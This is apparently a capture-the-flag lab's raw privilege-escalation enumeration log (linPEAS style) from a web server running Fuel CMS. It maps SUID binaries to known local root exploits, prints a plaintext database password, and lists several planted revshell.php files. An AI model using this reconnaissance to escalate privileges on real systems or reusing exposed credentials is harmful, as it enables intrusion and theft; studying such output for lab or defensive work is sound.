pgsql.allow_persistent = On
-rw-r--r-- 1 root root 70999 Jun  4  2019 /etc/php/7.0/cgi/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On
-rw-r--r-- 1 root root 70656 Jun  4  2019 /etc/php/7.0/cli/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On



╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Sep 30  2013 /usr/share/doc/rsync/examples/rsyncd.conf                                                                                                                                                          
[ftp]
        comment = public archive
        path = /var/www/pub
        use chroot = yes
        lock file = /var/lock/rsyncd
        read only = yes
        list = yes
        uid = nobody
        gid = nogroup
        strict modes = yes
        ignore errors = no
        ignore nonreadable = yes
        transfer logging = no
        timeout = 600
        refuse options = checksum dry-run
        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz


╔══════════╣ Analyzing Wifi Connections Files (limit 70)
drwxr-xr-x 2 root root 4096 Nov  2  2018 /etc/NetworkManager/system-connections                                                                                                                                                             
drwxr-xr-x 2 root root 4096 Nov  2  2018 /etc/NetworkManager/system-connections


╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'                                                                                                                                                                                        
drwxr-xr-x 2 root root 4096 Feb 26  2019 /etc/ldap


╔══════════╣ Searching ssl/ssh files
                                                                                                                                                                                                                                            
══╣ Possible private SSH keys were found!
/etc/ImageMagick-6/mime.xml

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow                                                                                                                                                                                                                            


Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes
    GSSAPIDelegateCredentials no

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Jul 26  2019 /etc/pam.d                                                                                                                                                                                         


╔══════════╣ Passwords inside pam.d
/etc/pam.d/lightdm:auth    sufficient      pam_succeed_if.so user ingroup nopasswdlogin                                                                                                                                                     



╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 4096 Feb 26  2019 /usr/share/keyrings                                                                                                                                                                                
drwxr-xr-x 2 root root 4096 Feb 26  2019 /var/lib/apt/keyrings




╔══════════╣ Analyzing Backup Manager Files (limit 70)
                                                                                                                                                                                                                                            
-rwxrwxrwx 1 root root 4646 Jul 26  2019 /var/www/html/fuel/application/config/database.php
|       ['password'] The password used to connect to the database
|       ['database'] The name of the database you want to connect to
        'password' => 'mememe',
        'database' => 'fuel_schema',

╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd                                                                                                                                                                                                              
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg                                                                                                                                                                                                                                
gpg Not Found
netpgpkeys Not Found                                                                                                                                                                                                                        
netpgp Not Found                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
-rw-r--r-- 1 root root 12255 Feb 26  2019 /etc/apt/trusted.gpg
-rw-r--r-- 1 root root 4114 Jun 14  2018 /usr/share/gnupg2/distsigkey.gpg
-rw-r--r-- 1 root root 12335 May 18  2012 /usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 0 May 18  2012 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 2253 Nov  5  2017 /usr/share/keyrings/ubuntu-esm-keyring.gpg
-rw-r--r-- 1 root root 1139 Nov  5  2017 /usr/share/keyrings/ubuntu-fips-keyring.gpg
-rw-r--r-- 1 root root 1227 May 18  2012 /usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 2256 Feb 26  2016 /usr/share/popularity-contest/debian-popcon.gpg
-rw-r--r-- 1 root root 12335 Feb 26  2019 /var/lib/apt/keyrings/ubuntu-archive-keyring.gpg



╔══════════╣ Analyzing Postfix Files (limit 70)
-rw-r--r-- 1 root root 694 May 18  2016 /usr/share/bash-completion/completions/postfix                                                                                                                                                      


╔══════════╣ Analyzing FTP Files (limit 70)
                                                                                                                                                                                                                                            

-rw-r--r-- 1 root root 69 Jun  4  2019 /etc/php/7.0/mods-available/ftp.ini
-rw-r--r-- 1 root root 69 Jun  4  2019 /usr/share/php7.0-common/common/ftp.ini






╔══════════╣ Analyzing Windows Files (limit 70)
                                                                                                                                                                                                                                            





















lrwxrwxrwx 1 root root 20 Jul 26  2019 /etc/alternatives/my.cnf -> /etc/mysql/mysql.cnf
lrwxrwxrwx 1 root root 24 Jul 26  2019 /etc/mysql/my.cnf -> /etc/alternatives/my.cnf
-rw-r--r-- 1 root root 81 Jul 26  2019 /var/lib/dpkg/alternatives/my.cnf




-rw-r--r-- 1 root root 553164 Feb 17  2016 /usr/share/gutenprint/5.2/xml/printers.xml























╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3771 Aug 31  2015 /etc/skel/.bashrc                                                                                                                                                                                  





-rw-r--r-- 1 root root 655 May 16  2017 /etc/skel/.profile






                               ╔═══════════════════╗
═══════════════════════════════╣ Interesting Files ╠═══════════════════════════════                                                                                                                                                         
                               ╚═══════════════════╝                                                                                                                                                                                        
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                                                                            
-rwsr-xr-- 1 root dip 386K Jun 12  2018 /usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)                                                                                                                                                 
-rwsr-xr-x 1 root root 19K Mar 17  2017 /usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
-rwsr-xr-x 1 root root 15K Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-sr-x 1 root root 97K Jan 29  2019 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-- 1 root messagebus 42K Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-sr-x 1 root root 11K Oct 25  2018 /usr/lib/xorg/Xorg.wrap
-rwsr-xr-x 1 root root 419K Jan 31  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10K Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 40K May 16  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 74K May 16  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 39K May 16  2017 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 23K Jan 15  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
-rwsr-xr-x 1 root root 11K May  8  2018 /usr/bin/vmware-user-suid-wrapper
-rwsr-xr-x 1 root root 134K Jul  4  2017 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 49K May 16  2017 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 53K May 16  2017 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 40K May 16  2017 /bin/su
-rwsr-xr-x 1 root root 44K May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 139K Jan 28  2017 /bin/ntfs-3g  --->  Debian9/8/7/Ubuntu/Gentoo/others/Ubuntu_Server_16.10_and_others(02-2017)
-rwsr-xr-x 1 root root 44K May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 40K May 16  2018 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 27K May 16  2018 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 31K Jul 12  2016 /bin/fusermount

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                                                                            
-rwxr-sr-x 1 root shadow 35K Apr  9  2018 /sbin/pam_extrausers_chkpwd                                                                                                                                                                       
-rwxr-sr-x 1 root shadow 35K Apr  9  2018 /sbin/unix_chkpwd
-rwxr-sr-x 1 root utmp 10K Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwxr-sr-x 1 root mail 14K Jul 25  2018 /usr/lib/evolution/camel-lock-helper-1.2
-rwsr-sr-x 1 root root 97K Jan 29  2019 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-sr-x 1 root root 11K Oct 25  2018 /usr/lib/xorg/Xorg.wrap
-rwxr-sr-x 1 root shadow 23K May 16  2017 /usr/bin/expiry
-rwxr-sr-x 1 root crontab 36K Apr  5  2016 /usr/bin/crontab
-rwxr-sr-x 1 root tty 27K May 16  2018 /usr/bin/wall
-rwxr-sr-x 1 root mlocate 39K Nov 17  2014 /usr/bin/mlocate
-rwxr-sr-x 1 root ssh 351K Jan 31  2019 /usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 15K Mar  1  2016 /usr/bin/bsd-write
-rwxr-sr-x 1 root shadow 61K May 16  2017 /usr/bin/chage

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld-so                                                                                                                                                                    
/etc/ld.so.conf                                                                                                                                                                                                                             
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/fakeroot-x86_64-linux-gnu.conf
/usr/lib/x86_64-linux-gnu/libfakeroot
  /etc/ld.so.conf.d/libc.conf
/usr/local/lib
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
/lib/x86_64-linux-gnu
/usr/lib/x86_64-linux-gnu
  /etc/ld.so.conf.d/x86_64-linux-gnu_EGL.conf
/usr/lib/x86_64-linux-gnu/mesa-egl
  /etc/ld.so.conf.d/x86_64-linux-gnu_GL.conf
/usr/lib/x86_64-linux-gnu/mesa

╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities                                                                                                                                                             
Current env capabilities:                                                                                                                                                                                                                   
Current: =
Current proc capabilities:
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

Parent Shell capabilities:
0x0000000000000000=

Files with capabilities (limited to 50):
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/arping = cap_net_raw+ep
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep

╔══════════╣ AppArmor binary profiles
-rw-r--r-- 1 root root  3310 Apr 12  2016 sbin.dhclient                                                                                                                                                                                     
-rw-r--r-- 1 root root  5995 Nov 30  2017 usr.bin.evince
-rw-r--r-- 1 root root  8477 Feb 14  2019 usr.bin.firefox
-rw-r--r-- 1 root root 38551 Dec 20  2016 usr.bin.webbrowser-app
-rw-r--r-- 1 root root 21809 Jan 29  2019 usr.lib.snapd.snap-confine.real
-rw-r--r-- 1 root root   469 Feb 13  2016 usr.sbin.cups-browsed
-rw-r--r-- 1 root root  5153 Dec 12  2018 usr.sbin.cupsd
-rw-r--r-- 1 root root   546 Sep 18  2015 usr.sbin.ippusbxd
-rw-r--r-- 1 root root  1550 Jul 23  2019 usr.sbin.mysqld
-rw-r--r-- 1 root root  1527 Jan  5  2016 usr.sbin.rsyslogd
-rw-r--r-- 1 root root  1469 Sep  8  2017 usr.sbin.tcpdump

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls                                                                                                                                                                     
files with acls in searched folders Not Found                                                                                                                                                                                               
                                                                                                                                                                                                                                            
╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path                                                                                                                                                  
/usr/sbin/alsa-info.sh                                                                                                                                                                                                                      
/usr/bin/amuFormat.sh
/usr/bin/gettext.sh

╔══════════╣ Executable files potentially added by user (limit 70)
2019-07-26+13:02:56.0995097690 /var/www/html/fuel/application/config/MY_fuel.php                                                                                                                                                            
2019-07-26+12:56:06.4763614110 /var/www/html/fuel/application/config/database.php
2019-07-26+12:54:33.3032077450 /var/www/html/robots.txt
2019-07-26+12:54:33.3032077450 /var/www/html/index.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/scripts/.htaccess
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/index.html
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/upload.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/tools.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/settings.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/reset.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/pwd_reset.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/preview.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/pages/page_create_edit.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/my_profile.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/modules/module_replace.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/modules/module_list.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/modules/module_delete.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/modules/module_create_edit.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/modules/module_close_modal.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/modal_select.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/manage/settings.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/manage/my_modules.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/manage/cache.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/manage.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/login.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/index.html
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/dashboard_ajax.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/dashboard.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/_layouts/documentation.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/_layouts/admin_main.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/_generate/simple/MY_fuel_modules.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/_generate/results_cli.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/_generate/results.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/_generate/model/{Model_name}_model.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/_generate/model/sql/{table}.sql
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/_generate/model/sql/news.sql
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/_generate/model/sql/events.sql
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/_generate/model/sql/careers.sql
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/_generate/model/News_model.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/_generate/model/Events_model.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/_generate/model/Careers_model.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/_generate/advanced/views/_docs/index.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/_generate/advanced/views/_admin/{module}.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/_generate/advanced/libraries/Fuel_{module}.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/_generate/advanced/language/english/{module}_lang.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/_generate/advanced/install/install.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/_generate/advanced/helpers/{module}_helper.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/_generate/advanced/controllers/{Module}_module.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/_generate/advanced/config/{module}_routes.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/_generate/advanced/config/{module}_constants.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/_generate/advanced/config/{module}.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/_generate/advanced/assets/js/{ModuleName}Controller.js
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/_generate/advanced/assets/images/ico_cog.png
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/_generate/advanced/assets/css/{module}.css
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/_docs/modules/tutorial.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/_docs/modules/tools.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/_docs/modules/simple.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/_docs/modules/module_forms.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/_docs/modules/hooks.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/_docs/modules/generate.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/_docs/modules/advanced.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/_docs/modules.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/_docs/main_toc.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/_docs/libraries/unzip.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/_docs/libraries/simplepie.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/_docs/libraries/my_typography.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/_docs/libraries/my_parser.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/_docs/libraries/my_model.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/_docs/libraries/my_image_lib.php
2019-07-26+12:54:33.3032077450 /var/www/html/fuel/modules/fuel/views/_docs/libraries/my_hooks.php
sort: write failed: 'standard output': Broken pipe
sort: write error

╔══════════╣ Unexpected in root
/initrd.img.old                                                                                                                                                                                                                             
/initrd.img
/vmlinuz

╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files                                                                                                                                                           
total 36                                                                                                                                                                                                                                    
drwxr-xr-x   2 root root  4096 Feb 26  2019 .
drwxr-xr-x 134 root root 12288 Jul 26  2019 ..
-rw-r--r--   1 root root    40 Feb 16  2017 appmenu-qt5.sh
-rw-r--r--   1 root root   825 Jan 29  2019 apps-bin-path.sh
-rw-r--r--   1 root root   663 May 18  2016 bash_completion.sh
-rw-r--r--   1 root root  1003 Dec 29  2015 cedilla-portuguese.sh
-rw-r--r--   1 root root  1941 Mar 16  2016 vte-2.91.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d                                                                                                                                             
                                                                                                                                                                                                                                            
═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No                                                                                                                                                                                                
═╣ Credentials in fstab/mtab? ........... No                                                                                                                                                                                                
═╣ Can I read shadow files? ............. No                                                                                                                                                                                                
═╣ Can I read shadow plists? ............ No                                                                                                                                                                                                
═╣ Can I write shadow plists? ........... No                                                                                                                                                                                                
═╣ Can I read opasswd file? ............. No                                                                                                                                                                                                
═╣ Can I write in network-scripts? ...... No                                                                                                                                                                                                
═╣ Can I read root folder? .............. No                                                                                                                                                                                                
                                                                                                                                                                                                                                            
╔══════════╣ Searching root files in home dirs (limit 30)
/home/                                                                                                                                                                                                                                      
/home/www-data/flag.txt
/root/
/var/www
/var/www/html
/var/www/html/.htaccess
/var/www/html/composer.json
/var/www/html/README.md
/var/www/html/assets
/var/www/html/assets/docs
/var/www/html/assets/docs/index.html
/var/www/html/assets/css
/var/www/html/assets/css/main.css
/var/www/html/assets/css/common.css
/var/www/html/assets/css/blog.css
/var/www/html/assets/css/reset.css
/var/www/html/assets/images
/var/www/html/assets/images/index.html
/var/www/html/assets/swf
/var/www/html/assets/swf/index.html
/var/www/html/assets/pdf
/var/www/html/assets/pdf/index.html
/var/www/html/assets/cache
/var/www/html/assets/cache/index.html
/var/www/html/assets/js
/var/www/html/assets/js/jquery.js
/var/www/html/assets/js/main.js
/var/www/html/robots.txt
/var/www/html/contributing.md
/var/www/html/index.php

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
/home/www-data                                                                                                                                                                                                                              

╔══════════╣ Readable files belonging to root and readable by me but not world readable
                                                                                                                                                                                                                                            
╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/var/log/syslog                                                                                                                                                                                                                             

logrotate 3.8.7

╔══════════╣ Files inside /home/www-data (limit 20)
total 12                                                                                                                                                                                                                                    
drwx--x--x 2 www-data www-data 4096 Jul 26  2019 .
drwxr-xr-x 3 root     root     4096 Jul 26  2019 ..
-rw-r--r-- 1 root     root       34 Jul 26  2019 flag.txt

╔══════════╣ Files inside others home (limit 20)
/var/www/html/.htaccess                                                                                                                                                                                                                     
/var/www/html/revshell.php.8
/var/www/html/revshell.php.5
/var/www/html/composer.json
/var/www/html/README.md
/var/www/html/revshell.php
/var/www/html/revshell.php.7
/var/www/html/revshell.php.1
/var/www/html/revshell.php.6
/var/www/html/revshell.php.11
/var/www/html/revshell.php.4
/var/www/html/revshell.php.12
/var/www/html/assets/docs/index.html
/var/www/html/assets/css/main.css
/var/www/html/assets/css/common.css
/var/www/html/assets/css/blog.css
/var/www/html/assets/css/reset.css
/var/www/html/assets/images/index.html
/var/www/html/assets/swf/index.html
/var/www/html/assets/pdf/index.html
grep: write error: Broken pipe

╔══════════╣ Searching installed mail applications
                                                                                                                                                                                                                                            
╔══════════╣ Mails (limit 50)
                                                                                                                                                                                                                                            
╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 17899 Jul 26  2019 /var/log/Xorg.0.log.old                                                                                                                                                                           
-rw-r--r-- 1 root root 128 Feb 26  2019 /var/lib/sgml-base/supercatalog.old
-rw-r--r-- 1 root root 8022 Jan 29  2019 /lib/modules/4.15.0-45-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 7974 Jan 29  2019 /lib/modules/4.15.0-45-generic/kernel/drivers/power/supply/wm831x_backup.ko
-rw-r--r-- 1 root root 446 Sep 10  2015 /usr/share/app-install/desktop/kbackup:kde4__kbackup.desktop
-rw-r--r-- 1 root root 449 Sep 10  2015 /usr/share/app-install/desktop/luckybackup:luckybackup.desktop
-rw-r--r-- 1 root root 396 Sep 10  2015 /usr/share/app-install/desktop/barrybackup-gui:barrybackup.desktop
-rw-r--r-- 1 root root 502 Sep 10  2015 /usr/share/app-install/desktop/slbackup-php:slbackup-php.desktop
-rw-r--r-- 1 root root 298768 Dec 29  2015 /usr/share/doc/manpages/Changes.old.gz
-rw-r--r-- 1 root root 7867 May  6  2015 /usr/share/doc/telnet/README.telnet.old.gz
-rwxr-xr-x 1 root root 1513 Oct 19  2013 /usr/share/doc/libipc-system-simple-perl/examples/rsync-backup.pl
-rw-r--r-- 1 root root 11308 Feb 26  2019 /usr/share/info/dir.old
-rw-r--r-- 1 root root 3050 Jun 21  2016 /usr/share/help/C/ubuntu-help/backup-thinkabout.page
-rw-r--r-- 1 root root 1989 Jun 21  2016 /usr/share/help/C/ubuntu-help/backup-frequency.page
-rw-r--r-- 1 root root 1687 Jun 21  2016 /usr/share/help/C/ubuntu-help/backup-check.page
-rw-r--r-- 1 root root 2266 Jun 21  2016 /usr/share/help/C/ubuntu-help/backup-where.page
-rw-r--r-- 1 root root 2498 Jun 21  2016 /usr/share/help/C/ubuntu-help/backup-what.page
-rw-r--r-- 1 root root 2374 Jun 21  2016 /usr/share/help/C/ubuntu-help/backup-how.page
-rw-r--r-- 1 root root 1383 Jun 21  2016 /usr/share/help/C/ubuntu-help/backup-restore.page
-rw-r--r-- 1 root root 1254 Jun 21  2016 /usr/share/help/C/ubuntu-help/backup-why.page
-rw-r--r-- 1 root root 3363 Oct 23  2015 /usr/share/help/C/gnome-help/backup-thinkabout.page
-rw-r--r-- 1 root root 1999 Oct 23  2015 /usr/share/help/C/gnome-help/backup-frequency.page
-rw-r--r-- 1 root root 1813 Oct 23  2015 /usr/share/help/C/gnome-help/backup-check.page
-rw-r--r-- 1 root root 2264 Oct 23  2015 /usr/share/help/C/gnome-help/backup-where.page
-rw-r--r-- 1 root root 2505 Oct 23  2015 /usr/share/help/C/gnome-help/backup-what.page
-rw-r--r-- 1 root root 2356 Oct 23  2015 /usr/share/help/C/gnome-help/backup-how.page
-rw-r--r-- 1 root root 1320 Oct 23  2015 /usr/share/help/C/gnome-help/backup-restore.page
-rw-r--r-- 1 root root 1262 Oct 23  2015 /usr/share/help/C/gnome-help/backup-why.page
-rw-r--r-- 1 root root 1581 Oct 27  2015 /usr/share/help/C/seahorse/misc-key-backup.page
-rw-r--r-- 1 root root 969 Oct  9  2013 /usr/share/help/C/deja-dup/backup-auto.page
-rw-r--r-- 1 root root 750 Oct 15  2013 /usr/share/help/C/deja-dup/backup-first.page
-rw-r--r-- 1 root root 76 Mar 31  2017 /usr/share/lightdm/lightdm.conf.d/50-disable-log-backup.conf
-rw-r--r-- 1 root root 3067 Jun 21  2016 /usr/share/help-langpack/en_GB/ubuntu-help/backup-thinkabout.page
-rw-r--r-- 1 root root 2020 Jun 21  2016 /usr/share/help-langpack/en_GB/ubuntu-help/backup-frequency.page
-rw-r--r-- 1 root root 1720 Jun 21  2016 /usr/share/help-langpack/en_GB/ubuntu-help/backup-check.page
-rw-r--r-- 1 root root 2289 Jun 21  2016 /usr/share/help-langpack/en_GB/ubuntu-help/backup-where.page
-rw-r--r-- 1 root root 2503 Jun 21  2016 /usr/share/help-langpack/en_GB/ubuntu-help/backup-what.page
-rw-r--r-- 1 root root 2371 Jun 21  2016 /usr/share/help-langpack/en_GB/ubuntu-help/backup-how.page
-rw-r--r-- 1 root root 1420 Jun 21  2016 /usr/share/help-langpack/en_GB/ubuntu-help/backup-restore.page
-rw-r--r-- 1 root root 1291 Jun 21  2016 /usr/share/help-langpack/en_GB/ubuntu-help/backup-why.page
-rw-r--r-- 1 root root 2543 Jun 24  2016 /usr/share/help-langpack/en_GB/evolution/backup-restore.page
-rw-r--r-- 1 root root 974 Apr  7  2016 /usr/share/help-langpack/en_GB/deja-dup/backup-auto.page
-rw-r--r-- 1 root root 755 Apr  7  2016 /usr/share/help-langpack/en_GB/deja-dup/backup-first.page
-rw-r--r-- 1 root root 3073 Jun 21  2016 /usr/share/help-langpack/en_AU/ubuntu-help/backup-thinkabout.page
-rw-r--r-- 1 root root 2018 Jun 21  2016 /usr/share/help-langpack/en_AU/ubuntu-help/backup-frequency.page
-rw-r--r-- 1 root root 1720 Jun 21  2016 /usr/share/help-langpack/en_AU/ubuntu-help/backup-check.page
-rw-r--r-- 1 root root 2295 Jun 21  2016 /usr/share/help-langpack/en_AU/ubuntu-help/backup-where.page
-rw-r--r-- 1 root root 2500 Jun 21  2016 /usr/share/help-langpack/en_AU/ubuntu-help/backup-what.page
-rw-r--r-- 1 root root 2392 Jun 21  2016 /usr/share/help-langpack/en_AU/ubuntu-help/backup-how.page
-rw-r--r-- 1 root root 1422 Jun 21  2016 /usr/share/help-langpack/en_AU/ubuntu-help/backup-restore.page
-rw-r--r-- 1 root root 1291 Jun 21  2016 /usr/share/help-langpack/en_AU/ubuntu-help/backup-why.page
-rw-r--r-- 1 root root 974 Apr  7  2016 /usr/share/help-langpack/en_AU/deja-dup/backup-auto.page
-rw-r--r-- 1 root root 755 Apr  7  2016 /usr/share/help-langpack/en_AU/deja-dup/backup-first.page
-rw-r--r-- 1 root root 3094 Jun 21  2016 /usr/share/help-langpack/en_CA/ubuntu-help/backup-thinkabout.page
-rw-r--r-- 1 root root 2034 Jun 21  2016 /usr/share/help-langpack/en_CA/ubuntu-help/backup-frequency.page
-rw-r--r-- 1 root root 1732 Jun 21  2016 /usr/share/help-langpack/en_CA/ubuntu-help/backup-check.page
